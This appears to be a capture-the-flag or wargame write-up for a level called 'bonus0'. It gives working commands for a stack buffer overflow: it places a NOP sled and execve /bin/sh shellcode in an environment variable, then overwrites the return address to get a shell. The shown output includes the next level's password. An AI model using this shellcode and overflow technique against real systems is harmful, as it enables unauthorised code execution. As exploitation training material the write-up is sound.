Same as the last exercice, we will implement an environment variable `EXPLOIT`, we will create it with :
```bash
export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'")
```

The first `read()` need 4095 bytes with an extra byte represented by `\n`.
We filled the second `read()` with 9 bytes, we place `0xbffff804` for overlap `EIP` which our `EXPLOIT` address and we finish by fill the buffer with 15 bytes and one extra byte for `\n` :
```bash
(python -c "print 'A' * 4095 + '\n' + 'A' * 9 + '\x04\xf8\xff\xbf' + 'A' * 15 + '\n'" ; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAA??? AAAAAAAAA???AAAAAAA???
whoami
bonus1
cd .. && cat bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```